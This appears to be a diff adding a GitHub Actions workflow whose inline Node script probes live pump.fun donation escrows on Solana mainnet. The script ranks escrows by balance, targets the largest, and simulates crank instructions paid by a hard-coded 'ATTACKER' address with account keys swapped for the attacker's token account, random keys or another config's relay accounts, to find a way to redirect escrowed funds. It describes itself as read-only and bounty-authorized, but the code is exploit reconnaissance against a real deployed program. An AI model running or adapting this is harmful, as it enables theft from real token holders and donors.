@@ -1,0 +1,54 @@
+name: donation-crank-live-runtime
+on:
+  push:
+    paths:
+      - '.github/workflows/donation-crank-live-runtime.yml'
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 12
+    steps:
+      - uses: actions/setup-node@v4
+        with: {node-version: 24}
+      - run: npm install --no-save @pump-fun/pump-sdk@1.36.0 @solana/web3.js @solana/spl-token bs58
+      - name: Read-only donation escrow scan and simulation-only relay differentials
+        shell: bash
+        run: |
+          node --input-type=module <<'NODE'
+          import bs58pkg from 'bs58';const bs58=bs58pkg.default??bs58pkg;
+          import {Connection,PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction,Keypair} from '@solana/web3.js';
+          import {TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID,getAssociatedTokenAddressSync,AccountLayout} from '@solana/spl-token';
+          import * as p from '@pump-fun/pump-sdk';
+
+          const FEE_PROGRAM=new PublicKey('pfeeUxB6jkeY1Hxd7CsFCAjcbHA9rWtchMGdZ6VojVZ');
+          const RELAY=p.DONATION_RELAY_PROGRAM_ID_MAINNET;
+          const ATTACKER=new PublicKey('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA');
+          const DISC=Buffer.from('f6c56009c11e5d73','hex');
+          const RPCS=['https://api.mainnet-beta.solana.com','https://rpc.solanatracker.io/public','https://solana-rpc.publicnode.com'];let id=1;const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+          async function one(url,method,params,n=3){let last;for(let a=0;a<n;a++){try{const r=await fetch(url,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-readonly-donation-crank/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method,params})});if(r.status===429||r.status>=500){last=Error('HTTP '+r.status);await sleep(500+650*a);continue}if(!r.ok)throw Error('HTTP '+r.status);const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));return {url,result:j.result}}catch(e){last=e;await sleep(350+500*a)}}throw last}
+          async function rpc(method,params){let last;for(const u of RPCS){try{return await one(u,method,params,3)}catch(e){last=e;console.log('RPCFAIL',method,u,String(e).slice(0,180))}}throw last}
+          function decodeRaw(pk,b){let o=8;return {pda:pk,bump:b[o++],version:b[o++],configId:bs58.encode(b.subarray(o,o+=32)),baseMint:bs58.encode(b.subarray(o,o+=32)),quoteMint:bs58.encode(b.subarray(o,o+=32)),creator:bs58.encode(b.subarray(o,o+=32)),totalDonated:b.readBigUInt64LE(o).toString(),lastCrankTs:b.readBigInt64LE(o+8).toString(),len:b.length}}
+          const g=await rpc('getProgramAccounts',[FEE_PROGRAM.toBase58(),{encoding:'base64',commitment:'confirmed',filters:[{memcmp:{offset:0,bytes:bs58.encode(DISC)}}]}]);const rows=g.result;console.log('DONATION_PDA_COUNT',rows.length,'rpc',g.url);
+          const items=[];for(const r of rows){const b=Buffer.from(r.account.data[0],'base64');if(b.length<154)continue;const x=decodeRaw(r.pubkey,b);const qm=new PublicKey(x.quoteMint),pda=new PublicKey(x.pda);x.ata=getAssociatedTokenAddressSync(qm,pda,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID).toBase58();items.push(x)}
+          for(let off=0;off<items.length;off+=100){const batch=items.slice(off,off+100);let vals;try{vals=(await rpc('getMultipleAccounts',[batch.map(x=>x.ata),{encoding:'base64',commitment:'confirmed'}])).result.value}catch(e){console.log('ATA_BATCH_SKIP',off,String(e));continue}for(let i=0;i<batch.length;i++){const a=vals[i];if(!a?.data?.[0]){batch[i].ataExists=false;batch[i].ataAmount='0';continue}const b=Buffer.from(a.data[0],'base64');batch[i].ataExists=true;batch[i].ataOwner=a.owner;try{batch[i].ataAmount=AccountLayout.decode(b).amount.toString()}catch{batch[i].ataAmount='0'}}await sleep(120)}
+          const positive=items.filter(x=>BigInt(x.ataAmount??'0')>0n).sort((a,b)=>BigInt(a.ataAmount)>BigInt(b.ataAmount)?-1:BigInt(a.ataAmount)<BigInt(b.ataAmount)?1:0);console.log('POSITIVE_SUMMARY',JSON.stringify({accounts:items.length,positive:positive.length},null,2));for(const x of positive.slice(0,30))console.log('POSITIVE',JSON.stringify(x));if(!positive.length)process.exit(0);
+
+          const target=positive[0],MINT=new PublicKey(target.baseMint),CONFIG=new PublicKey(target.configId),QUOTE=new PublicKey(target.quoteMint),DONATION=new PublicKey(target.pda),DONATION_ATA=new PublicKey(target.ata);
+          const epoch=p.donationRelayEpochTrackerPda(CONFIG,QUOTE,RELAY),debouncer=p.donationRelayDebouncerPda(CONFIG,QUOTE,RELAY),whitelist=p.donationRelayMintWhitelistPda(RELAY),relayEvent=p.donationRelayEventAuthorityPda(RELAY),debouncerAta=getAssociatedTokenAddressSync(QUOTE,debouncer,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID),attackerAta=getAssociatedTokenAddressSync(QUOTE,ATTACKER,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
+          console.log('TARGET',JSON.stringify({...target,relay:RELAY.toBase58(),relayEvent:relayEvent.toBase58(),whitelist:whitelist.toBase58(),epoch:epoch.toBase58(),debouncer:debouncer.toBase58(),debouncerAta:debouncerAta.toBase58(),attackerAta:attackerAta.toBase58()},null,2));
+          const conn=new Connection(RPCS[0],'confirmed');const sdk=p.PUMP_SDK;let control;try{control=await sdk.crankDonationFeePda({payer:ATTACKER,mint:MINT,configId:CONFIG,donationRelayProgramId:RELAY,quoteMint:QUOTE})}catch(e){console.log('BUILD_FAIL',String(e));process.exit(0)}console.log('CONTROL_KEYS',JSON.stringify(control.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));
+          function clone(ix,mut){const keys=ix.keys.map(k=>({...k}));mut(keys);return new TransactionInstruction({programId:ix.programId,keys,data:Buffer.from(ix.data)})}
+          function parse(logs){const t=(logs??[]).join('\n');return {account:t.match(/AnchorError caused by account: ([A-Za-z0-9_\-]+)/)?.[1]??null,code:t.match(/Error Code: ([A-Za-z0-9_]+)/)?.[1]??null,num:Number(t.match(/Error Number: (\d+)/)?.[1]??0)||null,interesting:(logs??[]).filter(x=>/Instruction:|AnchorError|Error Code|Error Number|Left:|Right:|donat|relay|debounc|whitelist|Transfer|failed|success/i.test(x)).slice(-160)}}
+          async function sim(label,ix,watch=[DONATION_ATA,debouncerAta,attackerAta]){const pre=await conn.getMultipleAccountsInfo(watch,'confirmed');const {blockhash}=await conn.getLatestBlockhash('processed');const tx=new VersionedTransaction(new TransactionMessage({payerKey:ATTACKER,recentBlockhash:blockhash,instructions:[ix]}).compileToV0Message());const raw=Buffer.from(tx.serialize()).toString('base64');const body={jsonrpc:'2.0',id:1,method:'simulateTransaction',params:[raw,{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed',accounts:{encoding:'base64',addresses:watch.map(x=>x.toBase58())}}]};const r=await fetch(RPCS[0],{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-donation-crank/1.0'},body:JSON.stringify(body)});const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));const v=j.result.value,e=parse(v.logs);const amount=a=>{if(!a?.data?.[0])return null;try{return AccountLayout.decode(Buffer.from(a.data[0],'base64')).amount.toString()}catch{return null}};console.log('\nSIM',label,JSON.stringify({err:v.err,units:v.unitsConsumed,account:e.account,code:e.code,num:e.num,pre:pre.map((a,i)=>({pk:watch[i].toBase58(),exists:!!a,amount:a?(()=>{try{return AccountLayout.decode(a.data).amount.toString()}catch{return null}})():null})),post:(v.accounts??[]).map((a,i)=>({pk:watch[i].toBase58(),exists:!!a,amount:amount(a)})),interesting:e.interesting},null,2));return {v,e}}
+          await sim('CONTROL',control);
+          const idx=(pk)=>control.keys.findIndex(k=>k.pubkey.equals(pk));
+          const mutations=[
+            ['relay_event_random',relayEvent,Keypair.generate().publicKey],['whitelist_random',whitelist,Keypair.generate().publicKey],['epoch_random',epoch,Keypair.generate().publicKey],['debouncer_random',debouncer,ATTACKER],['debouncer_ata_attacker',debouncerAta,attackerAta]
+          ];
+          for(const [label,oldPk,newPk] of mutations){const i=idx(oldPk);if(i<0){console.log('NO_INDEX',label);continue}await sim(label,clone(control,keys=>keys[i].pubkey=newPk))}
+          // Stronger cross-config test: use another live donation PDA's valid relay config if available.
+          const other=items.find(x=>x.configId!==target.configId&&x.quoteMint===target.quoteMint);if(other){const oc=new PublicKey(other.configId),oe=p.donationRelayEpochTrackerPda(oc,QUOTE,RELAY),od=p.donationRelayDebouncerPda(oc,QUOTE,RELAY),oda=getAssociatedTokenAddressSync(QUOTE,od,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);let ix=control;const ei=idx(epoch),di=idx(debouncer),dai=idx(debouncerAta);if(ei>=0&&di>=0&&dai>=0){ix=clone(control,keys=>{keys[ei].pubkey=oe;keys[di].pubkey=od;keys[dai].pubkey=oda});await sim('other_config_relay_tuple',ix,[DONATION_ATA,debouncerAta,oda])}}
+          NODE
